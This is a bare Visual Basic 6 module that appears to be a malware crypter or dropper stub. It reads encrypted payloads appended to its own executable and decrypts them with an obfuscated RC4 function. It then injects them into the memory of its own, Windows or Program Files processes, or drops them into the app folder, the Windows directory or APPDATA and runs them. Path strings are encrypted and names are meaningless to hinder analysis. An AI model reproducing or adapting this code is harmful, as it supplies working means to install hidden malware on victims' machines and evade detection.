Attribute VB_Name = "Module1"
Sub Main()
Dim tretz() As String
Dim ghmvd As String
Dim hggjf() As String
Open App.Path & Hmmm("µ", "klkm") & App.EXEName & Hmmm("Ç´þ£", "klkm") For Binary As #1
    ghmvd = Space(LOF(1))
    Get #1, , ghmvd
Close #1

tretz() = Split(ghmvd, "()()()")

For i = 1 To UBound(tretz()) - 2
    hggjf() = Split(tretz(i), "|||")
    
    Select Case hggjf(2)
    
    Case "1"
         
        Select Case hggjf(3)
        Case "1"
        omg.InjectExe App.Path & Hmmm("µ", "klkm") & App.EXEName & Hmmm("Ç´þ£", "klkm"), StrConv(Hmmm(hggjf(1), tretz(UBound(tretz()) - 1)), vbFromUnicode)
        Case "2"
        omg.InjectExe Environ("windir") & Hmmm("d­ˆilDõÕww", "hjhhd"), StrConv(Hmmm(hggjf(1), tretz(UBound(tretz()) - 1)), vbFromUnicode)
        Case "3"
        omg.InjectExe Environ("ProgramFiles") & Hmmm("džmqXóÛWb1ÈÀnE, !…½ÁnÖú¹£u|", "hjhhd"), StrConv(Hmmm(hggjf(1), tretz(UBound(tretz()) - 1)), vbFromUnicode)
        End Select
    Case "2"
        
        Select Case hggjf(3)
        Case "4"
        Open App.Path & "\" & Hmmm(hggjf(0), tretz(UBound(tretz()) - 1)) For Binary As #1
            Put #1, , Hmmm(hggjf(1), tretz(UBound(tretz()) - 1))
        Close #1
        Shell App.Path & "\" & Hmmm(hggjf(0), tretz(UBound(tretz()) - 1))
        Case "5"
        Open Environ("windir") & Hmmm("d»‰jf[Rµ§", "hjhhd") & Hmmm(hggjf(0), tretz(UBound(tretz()) - 1)) For Binary As #1
            Put #1, , Hmmm(hggjf(1), tretz(UBound(tretz()) - 1))
        Close #1
        Shell Environ("windir") & Hmmm("d»‰jf[Rµ§", "hjhhd") & Hmmm(hggjf(0), tretz(UBound(tretz()) - 1))
        Case "6"
        Open Environ("APPDATA") & "\" & Hmmm(hggjf(0), tretz(UBound(tretz()) - 1)) For Binary As #1
            Put #1, , Hmmm(hggjf(1), tretz(UBound(tretz()) - 1))
        Close #1
        Shell Environ("APPDATA") & "\" & Hmmm(hggjf(0), tretz(UBound(tretz()) - 1))
        End Select
    End Select
Next i
End Sub
Public Function Hmmm(ByVal mnm As String, ByVal klk As String) As String
On Error Resume Next
Dim gsf(0 To 255) As Integer, x As Long, y As Long, Z As Long, Key() As Byte, ByteArray() As Byte, Temp As Byte
If Len(klk) = 0 Then
    Exit Function
End If
If Len(mnm) = 0 Then
    Exit Function
End If
If Len(klk) > 256 Then
    Key() = StrConv(Left$(klk, 256), vbFromUnicode)
Else
    Key() = StrConv(klk, vbFromUnicode)
End If
For x = 0 To 255
    gsf(x) = x
Next x
x = 0
y = 0
Z = 0
For x = 0 To 255
    y = (y + gsf(x) + Key(x Mod Len(klk))) Mod 256
    Temp = gsf(x)
    gsf(x) = gsf(y)
    gsf(y) = Temp
Next x
x = 0
y = 0
Z = 0
ByteArray() = StrConv(mnm, vbFromUnicode)
For x = 0 To Len(mnm)
    y = (y + 1) Mod 256
    Z = (Z + gsf(y)) Mod 256
    Temp = gsf(y)
    gsf(y) = gsf(Z)
    gsf(Z) = Temp
    ByteArray(x) = ByteArray(x) Xor (gsf((gsf(y) + gsf(Z)) Mod 256))
Next x
Hmmm = StrConv(ByteArray, vbUnicode)
End Function
